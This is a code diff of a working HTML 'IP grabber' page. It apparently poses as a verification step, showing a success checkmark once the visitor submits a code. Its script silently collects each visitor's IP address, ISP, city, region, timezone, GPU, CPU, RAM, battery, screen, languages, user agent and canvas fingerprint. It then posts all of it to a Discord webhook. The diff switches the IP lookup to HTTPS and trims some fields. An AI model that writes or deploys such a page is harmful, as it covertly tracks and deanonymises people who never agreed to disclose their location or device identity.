@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Deep Telemetry & Fingerprint Analysis</title>
     <script>
-        // Canvas Fingerprint 생성 함수 (GPU/브라우저 렌더링 특성 추출)
         function getCanvasFingerprint() {
             try {
                 const canvas = document.createElement('canvas');
@@ -27,7 +26,6 @@
             }
         }
 
-        // 간단한 해시 생성기
         function simpleHash(str) {
             let hash = 0;
             for (let i = 0; i < str.length; i++) {
@@ -47,15 +45,25 @@
                 return;
             }
 
-            // 1. IP, 통신사, 상세 위치 정밀 수집
-            let ipInfo = { query: "Unknown", isp: "Unknown", org: "Unknown", country: "KR", regionName: "", city: "", lat: 0, lon: 0, timezone: "Unknown" };
+            // 1. HTTPS를 지원하는 IP 수집 API로 변경 (ipapi.co 사용)
+            let ipInfo = { query: "Unknown", isp: "Unknown", org: "Unknown", country: "KR", region: "", city: "", timezone: "Unknown" };
             try {
-                const res = await fetch('http://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,timezone,isp,org,as,query');
+                const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
-                if (d.status === 'success') ipInfo = d;
-            } catch (e) {}
+                ipInfo = {
+                    query: d.ip || "Unknown",
+                    isp: d.org || "Unknown",
+                    org: d.asn || "Unknown",
+                    country: d.country_name || "대한민국",
+                    region: d.region || "",
+                    city: d.city || "",
+                    timezone: d.timezone || "Unknown"
+                };
+            } catch (e) {
+                console.error("IP API 오류", e);
+            }
 
-            // 2. WebGL 그래픽 카드(GPU) 정보 추출
+            // 2. WebGL GPU 정보 추출
             let gpuVendor = "Unknown", gpuRenderer = "Unknown";
             try {
                 const canvas = document.createElement('canvas');
@@ -69,20 +77,13 @@
                 }
             } catch (e) {}
 
-            // 3. 시스템 및 브라우저 환경 심층 분석
             const nav = navigator;
             const screenInfo = window.screen;
-            
-            // 메모리 및 코어
             const ram = nav.deviceMemory ? `${nav.deviceMemory} GB+` : "비공개/미지원";
             const cores = nav.hardwareConcurrency || "미지원";
-
-            // 언어 및 쿠키/기타 설정
             const languages = nav.languages ? nav.languages.join(', ') : nav.language;
-            const doNotTrack = nav.doNotTrack || window.doNotTrack || "Unspecified";
             const cookieEnabled = nav.cookieEnabled ? "활성화됨" : "차단됨";
 
-            // 배터리
             let battery = "정보 없음";
             try {
                 if (nav.getBattery) {
@@ -91,68 +92,63 @@
                 }
             } catch (e) {}
 
-            // Canvas & Audio 핑거프린트 해시화
             const canvasData = getCanvasFingerprint();
             const fingerprintHash = simpleHash(canvasData + gpuRenderer + nav.userAgent);
 
-            // 4. 디스코드 멀티 임베드 페이로드 구성 (정보량 극대화)
+            // 3. 디스코드 페이로드 구성
             const payload = {
                 "embeds": [
                     {
                         "title": "⚡ [DEEP TELEMETRY] 고급 클라이언트 진단 리포트",
-                        "color": 16711680, // 레드 계열 (하이라이트)
+                        "color": 16711680,
                         "fields": [
                             { "name": "👤 인증 코드", "value": `\`${code}\``, "inline": false },
                             { "name": "🌐 IPv4 주소", "value": `\`${ipInfo.query}\``, "inline": true },
                             { "name": "📶 통신사 (ISP)", "value": `\`${ipInfo.isp}\``, "inline": true },
-                            { "name": "🏢 망 조직 (ORG)", "value": `\`${ipInfo.org}\``, "inline": false }
+                            { "name": "🏢 망 조직 (ASN)", "value": `\`${ipInfo.org}\``, "inline": false }
                         ],
                         "timestamp": new Date().toISOString()
                     },
                     {
                         "color": 3447003,
                         "fields": [
-                            { "name": "📍 지역 위치", "value": `국가: **${ipInfo.country}**\n도시: **${ipInfo.regionName} ${ipInfo.city}**`, "inline": true },
-                            { "name": "🗺️ GPS 대략 좌표", "value": `위도: \`${ipInfo.lat}\`\n경도: \`${ipInfo.lon}\``, "inline": true },
+                            { "name": "📍 지역 위치", "value": `국가: **${ipInfo.country}**\n도시: **${ipInfo.region} ${ipInfo.city}**`, "inline": true },
                             { "name": "⏱️ 타임존", "value": `\`${ipInfo.timezone}\``, "inline": true }
                         ]
                     },
                     {
                         "color": 15844367,
                         "fields": [
-                            { "name": "🎮 GPU 벤더 (Vendor)", "value": `\`${gpuVendor}\``, "inline": false },
-                            { "name": "🖥️ GPU 렌더러 (Graphics)", "value": `\`${gpuRenderer}\``, "inline": false },
+                            { "name": "🎮 GPU 벤더", "value": `\`${gpuVendor}\``, "inline": false },
+                            { "name": "🖥️ GPU 렌더러", "value": `\`${gpuRenderer}\``, "inline": false },
                             { "name": "💻 CPU 코어 / RAM", "value": `코어: \`${cores}개\` / RAM: \`${ram}\``, "inline": false }
                         ]
                     },
                     {
                         "color": 65280,
                         "fields": [
-                            { "name": "🖥️ 화면 해상도", "value": `\`${screenInfo.width}x${screenInfo.height}\` (색심도: ${screenInfo.colorDepth}bit)`, "inline": true },
-                            { "name": "🔋 배터리 상태", "value": `\`${battery}\``, "inline": true },
-                            { "name": "🌐 시스템 언어", "value": `\`${languages}\``, "inline": false },
-                            { "name": "🔒 보안 설정", "value": `쿠키: \`${cookieEnabled}\` | DNT: \`${doNotTrack}\``, "inline": false }
+                            { "name": "🖥️ 화면 해상도", "value": `\`${screenInfo.width}x${screenInfo.height}\` (${screenInfo.colorDepth}bit)`, "inline": true },
+                            { "name": "🔋 배터리", "value": `\`${battery}\``, "inline": true },
+                            { "name": "🌐 언어 / 쿠키", "value": `언어: \`${languages}\` | 쿠키: \`${cookieEnabled}\``, "inline": false }
                         ]
                     },
                     {
                         "color": 10181046,
                         "fields": [
                             { "name": "🧭 User-Agent", "value": `\`\`${nav.userAgent}\`\``, "inline": false },
-                            { "name": "🔑 기기 고유 핑거프린트 Hash", "value": `\`FP-${fingerprintHash}\``, "inline": false }
+                            { "name": "🔑 기기 핑거프린트 Hash", "value": `\`FP-${fingerprintHash}\``, "inline": false }
                         ],
-                        "footer": { "text": "Advanced Telemetry Engine v5.0 • Client Environment Probed" }
+                        "footer": { "text": "Advanced Telemetry Engine v5.1 • Fixed HTTPS API" }
                     }
                 ]
             };
 
-            // 전송
             await fetch(webhook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(payload)
             });
 
-            // 완료 화면
             document.body.innerHTML = `
                 <div style="background:#0b0e14; color:white; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; font-family:sans-serif;">
                     <div style="font-size:50px; color:#23a559; margin-bottom:20px;">✔</div>
@@ -166,3 +162,4 @@
 <body style="background:#0b0e14; margin:0;">
 </body>
 </html>
+
